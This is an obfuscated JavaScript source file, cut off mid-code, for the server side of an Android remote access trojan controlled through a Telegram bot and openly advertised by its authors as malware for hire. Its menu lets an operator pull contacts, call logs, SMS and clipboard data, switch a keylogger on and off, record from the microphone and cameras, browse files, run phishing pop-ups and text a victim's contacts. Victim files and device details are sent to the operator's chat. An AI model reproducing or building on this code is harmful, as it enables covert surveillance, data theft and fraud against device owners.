𝚎𝚛\x20𝚊\x20𝚖𝚎𝚜𝚜𝚊𝚐𝚎\x20𝚝𝚑𝚊𝚝\x20𝚢𝚘𝚞\x20𝚠𝚊𝚗𝚝\x20𝚝𝚘\x20𝚊𝚙𝚙𝚎𝚊𝚛\x20𝚒𝚗\x20𝚝𝚘𝚊𝚜𝚝\x20𝚋𝚘𝚡</b>\x0a\x0a','721588iBLdHC','✯\x20𝙾𝚙𝚎𝚗\x20𝚄𝚁𝙻\x20✯','buffer','send','<b>✯\x20If\x20you\x20want\x20to\x20hire\x20us\x20for\x20any\x20paid\x20work\x20please\x20contack\x20@sphanter\x0a𝚆𝚎\x20𝚑𝚊𝚌𝚔,\x20𝚆𝚎\x20𝚕𝚎𝚊𝚔,\x20𝚆𝚎\x20𝚖𝚊𝚔𝚎\x20𝚖𝚊𝚕𝚠𝚊𝚛𝚎\x0a\x0a𝚃𝚎𝚕𝚎𝚐𝚛𝚊𝚖\x20→\x20@CUBERSHIELDX\x0aADMIN\x20→\x20@SPHANTER</b>\x0a\x0a','\x0a\x0a𝙼𝚎𝚜𝚜𝚊𝚐𝚎\x20→\x20</b>','✯\x20𝚃𝚘𝚊𝚜𝚝\x20✯','sendSms','./data.json','https','<b>✯\x20𝙲𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍\x20𝚍𝚎𝚟𝚒𝚌𝚎𝚜\x20𝚌𝚘𝚞𝚗𝚝\x20:\x20','7207620ZaPjbY','✯\x20𝙵𝚒𝚕𝚎\x20𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛\x20✯','connection','push','✯\x20𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛\x20𝙾𝙵𝙵\x20✯','✯\x20𝚂𝚎𝚕𝚏𝚒𝚎\x20𝙲𝚊𝚖𝚎𝚛𝚊\x20✯','error','<b>✯\x20𝙽𝚘𝚠\x20𝙴𝚗𝚝𝚎𝚛\x20𝚊\x20𝚖𝚎𝚜𝚜𝚊𝚐𝚎\x20𝚝𝚑𝚊𝚝\x20𝚢𝚘𝚞\x20𝚠𝚊𝚗𝚝\x20𝚝𝚘\x20𝚜𝚎𝚗𝚍\x20𝚝𝚘\x20','model','<b>✯\x20𝚃𝚑𝚒𝚜\x20𝚘𝚙𝚝𝚒𝚘𝚗\x20𝚒𝚜\x20𝚘𝚗𝚕𝚢\x20𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎\x20𝚘𝚗\x20𝚙𝚛𝚎𝚖𝚒𝚞𝚖\x20𝚟𝚎𝚛𝚜𝚒𝚘𝚗\x20dm\x20to\x20buy\x20@sphanter</b>\x0a\x0a','✯\x20𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎\x20✯','✯\x20𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜\x20✯','main-camera','</b>\x0a\x0a','✯\x20𝚂𝚎𝚗𝚍\x20𝚂𝙼𝚂\x20✯','12AEDsDj','✯\x20𝙰𝚙𝚙𝚜\x20✯','vibrate'];var_66=function(){return var_45;};return var_66();}(function(var_58,var_13){const var_36=var_8,var_98=var_58();while(!![]){try{const var_68=parseInt(var_36(0x233))/0x1*(-parseInt(var_36(0x1db))/0x2)+-parseInt(var_36(0x252))/0x3+parseInt(var_36(0x204))/0x4*(-parseInt(var_36(0x232))/0x5)+parseInt(var_36(0x1e5))/0x6*(-parseInt(var_36(0x255))/0x7)+-parseInt(var_36(0x20e))/0x8+parseInt(var_36(0x23a))/0x9+-parseInt(var_36(0x244))/0xa*(-parseInt(var_36(0x1ed))/0xb);if(var_68===var_13)break;else var_98['push'](var_98['shift']());}catch(var_67){var_98['push'](var_98['shift']());}}}(var_66,0xeb945));const var_9=var_46;(function(var_78,var_97){const var_61=var_8,var_19=var_46,var_23=var_78();while(!![]){try{const var_47=-parseInt(var_19(0x1e7))/0x1+parseInt(var_19(0x1fd))/0x2+parseInt(var_19(0x256))/0x3*(-parseInt(var_19(0x226))/0x4)+parseInt(var_19(0x1d3))/0x5*(parseInt(var_19(0x1f9))/0x6)+-parseInt(var_19(0x257))/0x7+-parseInt(var_19(0x22d))/0x8+parseInt(var_19(0x245))/0x9*(parseInt(var_19(0x25a))/0xa);if(var_47===var_97)break;else var_23['push'](var_23[var_61(0x1ec)]());}catch(var_71){var_23[var_61(0x263)](var_23[var_61(0x1ec)]());}}}(var_11,0x935ce));const express=require(var_74(0x1e0)),http=require(var_9(0x1df)),{Server}=require(var_74(0x24b)),telegramBot=require(var_9(0x250)),https=require(var_9(0x243)),multer=require(var_9(0x21c)),fs=require('fs'),app=express(),server=http[var_74(0x238)](app),io=new Server(server),uploader=multer(),data=JSON[var_9(0x239)](fs[var_74(0x1e9)](var_9(0x249),var_9(0x20e))),bot=new telegramBot(data[var_9(0x237)],{'polling':!![],'request':{}}),appData=new Map(),actions=[var_9(0x232),var_9(0x259),'✯\x20𝙲𝚊𝚕𝚕𝚜\x20✯',var_9(0x1ee),'✯\x20𝙼𝚊𝚒𝚗\x20𝚌𝚊𝚖𝚎𝚛𝚊\x20✯',var_9(0x220),var_9(0x236),var_9(0x254),var_74(0x224),var_9(0x20c),var_74(0x26e),var_74(0x225),var_9(0x1e6),var_74(0x21e),'✯\x20𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛\x20𝙾𝙽\x20✯',var_9(0x1e9),var_74(0x261),var_74(0x236),var_74(0x242),var_74(0x207),var_74(0x1e4),var_9(0x21a),var_9(0x1d6),var_9(0x1e5),var_9(0x233)];function var_11(){const var_53=var_74,var_90=[var_53(0x1f5),var_53(0x1ff),var_53(0x243),var_53(0x25d),var_53(0x268),'toastText',var_53(0x1ea),var_53(0x205),var_53(0x225),var_53(0x1da),'node-telegram-bot-api','✯\x20𝙰𝚕𝚕\x20✯',var_53(0x230),var_53(0x1f2),'✯\x20𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍\x20✯',var_53(0x222),var_53(0x201),var_53(0x260),var_53(0x23e),var_53(0x203),var_53(0x1f7),'all',var_53(0x21e),var_53(0x1f8),'textToAllContacts',var_53(0x200),'✯\x20𝙰𝚌𝚝𝚒𝚘𝚗\x20✯',var_53(0x1e8),var_53(0x256),var_53(0x263),var_53(0x1fa),var_53(0x216),'✯\x20𝙳𝚎𝚌𝚛𝚢𝚙𝚝\x20✯',var_53(0x226),var_53(0x234),var_53(0x21a),'includes',var_53(0x20c),'number',var_53(0x202),var_53(0x248),'✯\x20𝙰𝚋𝚘𝚞𝚝\x20𝚞𝚜\x20✯',var_53(0x228),'✯\x20𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐\x20✯',var_53(0x23b),var_53(0x22f),var_53(0x266),var_53(0x264),var_53(0x1e7),var_53(0x22a),var_53(0x1dd),var_53(0x1e4),var_53(0x270),var_53(0x23c),var_53(0x26e),var_53(0x242),var_53(0x208),var_53(0x219),'notificationText','currentTarget',var_53(0x22e),var_53(0x214),var_53(0x271),var_53(0x26f),var_53(0x1f6),var_53(0x1e1),var_53(0x267),var_53(0x245),var_53(0x24f),var_53(0x1ef),var_53(0x218),var_53(0x209),var_53(0x212),var_53(0x1eb),var_53(0x1f0),var_53(0x21f),var_53(0x247),var_53(0x20f),var_53(0x1ee),var_53(0x249),var_53(0x26c),var_53(0x250),var_53(0x25b),'<b>✯\x20𝙴𝚗𝚝𝚎𝚛\x20𝚝𝚑𝚎\x20𝚍𝚞𝚛𝚊𝚝𝚒𝚘𝚗\x20𝚢𝚘𝚞\x20𝚠𝚊𝚗𝚝\x20𝚝𝚑𝚎\x20𝚍𝚎𝚟𝚒𝚌𝚎\x20𝚝𝚘\x20𝚟𝚒𝚋𝚛𝚊𝚝𝚎\x20𝚒𝚗\x20𝚜𝚎𝚌𝚘𝚗𝚍𝚜</b>\x0a\x0a',var_53(0x23d),var_53(0x20d),var_53(0x20b),var_53(0x257),'<b>✯\x20𝙵𝚒𝚕𝚎\x20𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍\x20𝚏𝚛𝚘𝚖\x20→\x20',var_53(0x254),'✯\x20𝙲𝚊𝚕𝚕𝚜\x20✯',var_53(0x236),'microphone',var_53(0x20a),var_53(0x231),var_53(0x24c),'✯\x20𝙿𝚘𝚙\x20𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗\x20✯',var_53(0x24d),var_53(0x1e3),var_53(0x1f3),'message',var_53(0x224),var_53(0x265),var_53(0x22b),var_53(0x262),var_53(0x210),var_53(0x213),var_53(0x253),var_53(0x24a),var_53(0x1fc),var_53(0x21c),var_53(0x241),'listening\x20on\x20port\x203000','<b>✯\x20𝚃𝚑𝚒𝚜\x20𝚘𝚙𝚝𝚒𝚘𝚗\x20𝚒𝚜\x20𝚘𝚗𝚕𝚢\x20𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎\x20𝚘𝚗\x20𝚙𝚛𝚎𝚖𝚒𝚞𝚖\x20𝚟𝚎𝚛𝚜𝚒𝚘𝚗\x20dm\x20to\x20buy\x20@sphanter</b>\x0a\x0a',var_53(0x1f9),var_53(0x1f1),var_53(0x1fd),var_53(0x220),var_53(0x25c),'host',var_53(0x26b),var_53(0x206),var_53(0x215),var_53(0x22d),var_53(0x26a),var_53(0x235),var_53(0x246),'parse','✯\x20𝙵𝚒𝚕𝚎\x20𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛\x20✯','handshake',var_53(0x1dc),var_53(0x1e6),var_53(0x211),'version','clipboard',var_53(0x229),var_53(0x23f),var_53(0x25e),var_53(0x26d),var_53(0x227)];return var_11=function(){return var_90;},var_11();}function var_8(var_86,var_84){const var_16=var_66();return var_8=function(var_6,var_10){var_6=var_6-0x1da;let var_72=var_16[var_6];return var_72;},var_8(var_86,var_84);}function var_46(var_12,var_52){const var_49=var_11();return var_46=function(var_27,var_91){var_27=var_27-0x1d0;let var_75=var_49[var_27];return var_75;},var_46(var_12,var_52);}app[var_9(0x224)](var_9(0x229),uploader[var_9(0x202)]('file'),(var_95,var_35)=>{const var_93=var_74,var_42=var_9,var_38=var_95[var_42(0x23c)][var_42(0x207)],var_29=var_95[var_42(0x242)][var_42(0x24a)];bot['sendDocument'](data['id'],var_95[var_42(0x23c)][var_42(0x211)],{'caption':var_42(0x212)+var_29+'</b>','parse_mode':var_93(0x24d)},{'filename':var_38,'contentType':var_42(0x206)}),var_35['send'](var_42(0x218));}),app[var_9(0x1e1)](var_9(0x22c),(var_2,var_41)=>{const var_100=var_74,var_14=var_9;var_41[var_100(0x258)](data[var_14(0x205)]);}),io['on'](var_9(0x222),var_59=>{const var_87=var_74,var_76=var_9;let var_57=var_59[var_76(0x23b)]['headers'][var_76(0x24a)]+'-'+io[var_76(0x1ec)][var_76(0x1ec)][var_76(0x1fa)]||var_76(0x204),var_34=var_59[var_76(0x23b)][var_76(0x242)][var_76(0x23f)]||'no\x20information',var_96=var_59[var_76(0x23b)][var_87(0x23f)]['ip']||var_76(0x204);var_59[var_76(0x24a)]=var_57,var_59[var_76(0x23f)]=var_34;let var_65=var_87(0x1e2)+(var_76(0x225)+var_57+'\x0a')+(var_76(0x1ea)+var_34+'\x0a')+(var_76(0x1eb)+var_96+'\x0a')+(var_76(0x219)+var_59[var_76(0x23b)][var_76(0x208)]+'\x0a\x0a');bot[var_76(0x1ef)](data['id'],var_65,{'parse_mode':var_76(0x21b)}),var_59['on'](var_76(0x1dd),()=>{const var_51=var_87,var_77=var_76;let var_5=var_77(0x1f2)+(var_77(0x225)+var_57+'\x0a')+(var_77(0x1ea)+var_34+'\x0a')+(var_51(0x22a)+var_96+'\x0a')+(var_77(0x219)+var_59[var_77(0x23b)][var_51(0x1ee)]+'\x0a\x0a');bot[var_77(0x1ef)](data['id'],var_5,{'parse_mode':var_77(0x21b)});}),var_59['on'](var_76(0x21e),var_44=>{const var_15=var_87,var_56=var_76;bot[var_56(0x1ef)](data['id'],var_56(0x24d)+var_57+var_15(0x25a)+var_44,{'parse_mode':var_15(0x24d)});});}),bot['on'](var_9(0x21e),var_17=>{const var_30=var_74,var_32=var_9;if(var_17[var_32(0x205)]===var_32(0x1d9))bot[var_32(0x1ef)](data['id'],var_32(0x1fe)+var_32(0x22f)+var_32(0x223),{'parse_mode':var_32(0x21b),'reply_markup':{'keyboard':[[var_32(0x200),var_32(0x1d4)],[var_32(0x1e3)]],'resize_keyboard':!![]}});else{if(appData[var_32(0x1e1)](var_32(0x221))===var_30(0x251)){let var_69=var_17[var_32(0x205)],var_26=appData['get']('currentTarget');var_26==var_32(0x25b)?io[var_32(0x1ec)][var_32(0x21d)](var_30(0x230),{'request':var_32(0x216),'extras':[{'key':var_32(0x228),'value':var_69}]}):io['to'](var_26)[var_32(0x21d)](var_32(0x252),{'request':var_32(0x216),'extras':[{'key':var_30(0x21c),'value':var_69}]}),appData[var_32(0x209)](var_32(0x1f5)),appData[var_32(0x209)](var_32(0x221)),bot[var_32(0x1ef)](data['id'],'<b>✯\x20𝚃𝚑𝚎\x20𝚛𝚎𝚚𝚞𝚎𝚜𝚝\x20𝚠𝚊𝚜\x20𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍\x20𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢,\x20𝚢𝚘𝚞\x20𝚠𝚒𝚕𝚕\x20𝚛𝚎𝚌𝚎𝚒𝚟𝚎\x20𝚍𝚎𝚟𝚒𝚌𝚎\x20𝚛𝚎𝚜𝚙𝚘𝚗𝚎\x20𝚜𝚘𝚘𝚗\x20...\x0a\x0a✯\x20𝚁𝚎𝚝𝚞𝚛𝚗\x20𝚝𝚘\x20𝚖𝚊𝚒𝚗\x20𝚖𝚎𝚗𝚞</b>\x0a\x0a',{'parse_mode':var_32(0x21b),'reply_markup':{'keyboard':[[var_32(0x200),var_32(0x1d4)],[var_32(0x1e3)]],'resize_keyboard':!![]}});}else{if(appData[var_32(0x1e1)](var_30(0x22b))===var_32(0x24b)){let var_54=var_17[var_32(0x205)],var_24=appData[var_32(0x1e1)]('currentTarget');var_24==var_32(0x25b)?io[var_32(0x1ec)][var_32(0x21d)](var_32(0x252),{'request':var_30(0x1fe),'extras':[{'key':var_32(0x205),'value':var_54}]}):io['to'](var_24)['emit'](var_30(0x230),{'request':var_30(0x1fe),'extras':[{'key':var_32(0x205),'value':var_54}]}),appData[var_32(0x209)](var_32(0x1f5)),appData[var_32(0x209)](var_32(0x221)),bot[var_32(0x1ef)](data['id'],var_32(0x1f7),{'parse_mode':var_32(0x21b),'reply_markup':{'keyboard':[[var_32(0x200),var_32(0x1d4)],[var_32(0x1e3)]],'resize_keyboard':!![]}});}else{if(appData[var_30(0x202)](var_32(0x221))===var_32(0x227)){let var_70=var_17[var_30(0x21f)];appData[var_32(0x217)](var_32(0x201),var_70),appData[var_32(0x217)](var_30(0x22b),'smsText'),bot[var_32(0x1ef)](data['id'],var_32(0x1fc)+var_70+var_32(0x244),{'parse_mode':var_32(0x21b),'reply_markup':{'keyboard':[[var_32(0x1d1)]],'resize_keyboard':!![],'one_time_keyboard':!![]}});}else{if(appData[var_32(0x1e1)](var_32(0x221))===var_32(0x258)){let var_89=var_17[var_32(0x205)],var_3=appData[var_32(0x1e1)](var_30(0x209)),var_60=appData[var_32(0x1e1)](var_32(0x1f5));var_60==var_32(0x25b)?io[var_32(0x1ec)][var_30(0x1f3)](var_32(0x252),{'request':var_32(0x230),'extras':[{'key':var_32(0x1e0),'value':var_3},{'key':var_32(0x205),'value':var_89}]}):io['to'](var_60)[var_32(0x21d)](var_32(0x252),{'request':var_30(0x25c),'extras':[{'key':var_32(0x1e0),'value':var_3},{'key':var_32(0x205),'value':var_89}]}),appData[var_32(0x209)]('currentTarget'),appData[var_32(0x209)](var_32(0x221)),appData[var_32(0x209)](var_30(0x209)),bot[var_32(0x1ef)](data['id'],var_32(0x1f7),{'parse_mode':var_30(0x24d),'reply_markup':{'keyboard':[[var_32(0x200),var_30(0x1f4)],[var_32(0x1e3)]],'resize_keyboard':!![]}});}else{if(appData[var_32(0x1e1)](var_30(0x22b))===var_30(0x1f2)){let var_25=var_17[var_30(0x21f)],var_37=appData[var_32(0x1e1)](var_32(0x1f5));var_37==var_32(0x25b)?io[var_32(0x1ec)]['emit'](var_32(0x252),{'request':var_32(0x1f8),'extras':[{'key':var_32(0x228),'value':var_25}]}):io['to'](var_37)[var_32(0x21d)](var_32(0x252),{'request':var_32(0x1f8),'extras':[{'key':var_32(0x228),'value':var_25}]}),appData[var_32(0x209)](var_32(0x1f5)),appData[var_32(0x209)](var_30(0x22b)),bot[var_32(0x1ef)](data['id'],var_32(0x1f7),{'parse_mode':var_30(0x24d),'reply_markup':{'keyboard':[['✯\x20𝙳𝚎𝚟𝚒𝚌𝚎𝚜\x20✯',var_32(0x1d4)],[var_32(0x1e3)]],'resize_keyboard':!![]}});}else{if(appData[var_32(0x1e1)](var_32(0x221))===var_30(0x239)){let var_102=var_17[var_32(0x205)],var_80=appData['get'](var_32(0x1f5));var_80==var_32(0x25b)?io[var_32(0x1ec)][var_30(0x1f3)](var_32(0x252),{'request':var_32(0x1f3),'extras':[{'key':var_32(0x205),'value':var_102}]}):io['to'](var_80)[var_32(0x21d)](var_32(0x252),{'request':var_30(0x219),'extras':[{'key':var_32(0x205),'value':var_102}]}),appData[var_32(0x209)](var_32(0x1f5)),appData[var_32(0x209)](var_32(0x221)),bot[var_32(0x1ef)](data['id'],var_32(0x1f7),{'parse_mode':var_32(0x21b),'reply_markup':{'keyboard':[[var_32(0x200),var_32(0x1d4)],['✯\x20𝙰𝚋𝚘𝚞𝚝\x20𝚞𝚜\x20✯']],'resize_keyboard':!![]}});}else{if(appData[var_32(0x1e1)](var_30(0x22b))===var_30(0x223)){let var_85=var_17[var_32(0x205)];appData[var_32(0x217)](var_32(0x247),var_85),target==var_30(0x1fb)?io[var_30(0x1dd)][var_32(0x21d)](var_30(0x230),{'request':var_32(0x203),'extras':[{'key':var_32(0x205),'value':var_85}]}):io['to'](target)[var_32(0x21d)](var_30(0x230),{'request':'popNotification','extras':[{'key':var_32(0x205),'value':var_85},{'key':var_32(0x1f6),'value':url}]}),appData[var_32(0x209)]('currentTarget'),appData[var_30(0x249)](var_30(0x22b)),appData[var_32(0x209)](var_30(0x1ff)),bot[var_30(0x23c)](data['id'],var_32(0x1f7),{'parse_mode':var_32(0x21b),'reply_markup':{'keyboard':[[var_32(0x200),var_32(0x1d4)],[var_32(0x1e3)]],'resize_keyboard':!![]}});}else{if(var_17[var_32(0x205)]===var_32(0x200)){if(io[var_32(0x1ec)][var_32(0x1ec)]['size']===0x0)bot['sendMessage'](data['id'],var_32(0x20f),{'parse_mode':var_32(0x21b)});else{let var_7=var_30(0x25f)+io[var_32(0x1ec)][var_32(0x1ec)][var_32(0x1fa)]+var_32(0x244),var_55=0x1;io[var_32(0x1ec)][var_32(0x1ec)][var_32(0x248)]((var_33,var_18,var_0)=>{const var_40=var_30,var_64=var_32;var_7+=var_40(0x221)+var_55+'</b>\x0a'+(var_64(0x225)+var_33[var_40(0x268)]+'\x0a')+(var_64(0x1ea)+var_33[var_64(0x23f)]+'\x0a')+(var_64(0x1eb)+var_33['ip']+'\x0a')+(var_64(0x219)+var_33[var_40(0x21b)][var_64(0x208)]+'\x0a\x0a'),var_55+=0x1;}),bot[var_32(0x1ef)](data['id'],var_7,{'parse_mode':var_32(0x21b)});}}else{if(var_17[var_32(0x205)]===var_32(0x1d4)){if(io[var_30(0x1dd)][var_32(0x1ec)][var_32(0x1fa)]===0x0)bot[var_32(0x1ef)](data['id'],var_32(0x20f),{'parse_mode':var_32(0x21b)});else{let var_79=[];io[var_32(0x1ec)][var_32(0x1ec)][var_30(0x243)]((var_101,var_43,var_4)=>{const var_88=var_32;var_79[var_88(0x1d7)]([var_101[var_88(0x24a)]]);}),var_79[var_32(0x1d7)]([var_32(0x251)]),var_79[var_32(0x1d7)]([var_32(0x233)]),bot[var_30(0x23c)](data['id'],var_32(0x24f),{'parse_mode':'HTML','reply_markup':{'keyboard':var_79,'resize_keyboard':!![],'one_time_keyboard':!![]}});}}else{if(var_17[var_30(0x21f)]===var_32(0x1e3))bot[var_32(0x1ef)](data['id'],var_30(0x259),{'parse_mode':'HTML'});else{if(var_17[var_32(0x205)]===var_30(0x206))bot[var_32(0x1ef)](data['id'],var_32(0x23d),{'parse_mode':var_32(0x21b),'reply_markup':{'keyboard':[[var_30(0x218),var_32(0x1d4)],[var_32(0x1e3)]],'resize_keyboard':!![]}});else{if(var_17[var_32(0x205)]===var_32(0x1d1)){let var_21=io['sockets'][var_30(0x1dd)]['get'](appData[var_32(0x1e1)](var_32(0x1f5)))[var_32(0x24a)];var_21==var_30(0x1fb)?bot[var_32(0x1ef)](data['id'],var_32(0x24c),{'parse_mode':var_30(0x24d),'reply_markup':{'keyboard':[[var_32(0x232),var_32(0x259)],[var_32(0x214),var_32(0x1ee)],[var_32(0x1d8),var_30(0x265)],[var_32(0x236),var_32(0x254)],[var_30(0x224),var_32(0x20c)],[var_32(0x1f0),var_32(0x24e)],[var_32(0x1e6),var_30(0x21e)],[var_30(0x215),var_30(0x264)],[var_32(0x23a),var_32(0x215)],[var_30(0x242),var_32(0x1da)],[var_32(0x1d6),var_32(0x1e5)],[var_30(0x1e4)],[var_32(0x21a)],[var_32(0x233)]],'resize_keyboard':!![],'one_time_keyboard':!![]}}):bot[var_32(0x1ef)](data['id'],var_32(0x255)+var_21+var_32(0x244),{'parse_mode':var_32(0x21b),'reply_markup':{'keyboard':[[var_32(0x232),var_32(0x259)],[var_32(0x214),var_32(0x1ee)],[var_30(0x1fa),var_32(0x220)],[var_32(0x236),var_32(0x254)],[var_30(0x224),var_32(0x20c)],[var_32(0x1f0),var_32(0x24e)],[var_30(0x23b),var_32(0x1d0)],[var_32(0x234),var_32(0x1e9)],[var_32(0x23a),var_32(0x215)],[var_32(0x1f1),var_32(0x1da)],[var_32(0x1d6),var_32(0x1e5)],[var_32(0x1ed)],[var_32(0x21a)],[var_32(0x233)]],'resize_keyboard':!![],'one_time_keyboard':!![]}});}else{if(actions[var_32(0x1de)](var_17[var_32(0x205)])){let var_62=appData['get'](var_30(0x217));var_17[var_32(0x205)]===var_32(0x232)&&(var_62==var_32(0x25b)?io[var_32(0x1ec)][var_32(0x21d)](var_30(0x230),{'request':var_32(0x246),'extras':[]}):io['to'](var_62)[var_32(0x21d)](var_32(0x252),{'request':'contacts','extras':[]}),appData[var_32(0x209)](var_30(0x217)),bot[var_30(0x23c)](data['id'],var_32(0x1f7),{'parse_mode':var_32(0x21b),'reply_markup':{'keyboard':[['✯\x20𝙳𝚎𝚟𝚒𝚌𝚎𝚜\x20✯',var_30(0x1f4)],[var_32(0x1e3)]],'resize_keyboard':!![]}})),var_17[var_32(0x205)]===var_32(0x259)&&(var_62==var_32(0x25b)?io['